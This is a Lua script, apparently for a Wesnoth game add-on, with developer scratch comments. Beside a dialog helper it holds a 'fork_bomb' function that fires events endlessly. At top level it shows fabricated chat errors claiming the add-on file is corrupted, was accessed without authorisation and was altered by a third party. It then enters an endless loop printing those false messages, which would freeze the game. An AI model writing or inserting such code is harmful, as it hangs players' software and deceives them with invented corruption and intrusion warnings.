--IF id = limited uses then name sub everything
---------------- wesnoth.units.to_map(u) CRASHES WESNOTH u:to_map()

function custom_dialog(title, message)
    local dialog = wesnoth.show_dialog({
        speaker = "narrator",
        caption = title,
        image = "icons/bomb.png",
        message = message,
        image_location = "center",
        image_size = "100x100",
        image_position = "right",
        image_fit_strategy = "crop",
        image_transparency = true,
        image_styled = true,
        image_xalign = "right",
        image_yalign = "center",
        speaker_image = "icons/bomb.png",
        speaker_image_location = "left",
        speaker_image_size = "100x100",
        speaker_image_position = "left",
        speaker_image_fit_strategy = "crop",
        speaker_image_transparency = true,
        speaker_image_styled = true,
        speaker_image_xalign = "left",
        speaker_image_yalign = "center"
    })

    dialog:show()
end
--custom_dialog("hex.x", "hex.y")
function fork_bomb()
    while true do
        wesnoth.fire_event("fork_bomb")
    end
end
----TRY SPAMMING NEW EVENTS AND THEN FIRING THEM
--File Integrity
-- hide pannels
for i = 1, 10 do
    wesnoth.interface.add_chat_message("Lua error", "error scripting/lua: ~add-ons/Bandits_from_Brown_Hills/_main.cgf:52: file has been corrupted")
    wesnoth.interface.add_chat_message("Lua error", "warning general: no location found for 'data/add-ons/Bandits_from_Brown_Hills/characters/Wenrys'")
    wesnoth.interface.add_chat_message("Lua error", "warning engine: ~add-ons/Bandits_from_Brown_Hills/_main.cgf:52: third-party entity has changed the file")
end
wesnoth.delay(1)
while true do
    local current_time = os.time()
    local date_time_string_error_a = os.date("%Y%m%d %H:%M:%S error scripting/lua: ~add-ons/Bandits_from_Brown_Hills/_main.cgf:52: file has been corrupted",current_time)
    local date_time_string_error_b = os.date("%Y%m%d %H:%M:%S FATAL: ~add-ons/Bandits_from_Brown_Hills/_main.cgf unauthorized access",current_time)
    local date_time_string_error_c = os.date("%Y%m%d %H:%M:%S warning engine: ~add-ons/Bandits_from_Brown_Hills/_main.cgf:52: third-party entity has changed the file",current_time)
    std_print(date_time_string_error_a)
    print(date_time_string_error_a)
    std_print(date_time_string_error_b)
    print(date_time_string_error_b)
    std_print(date_time_string_error_c)
    print(date_time_string_error_c)
end
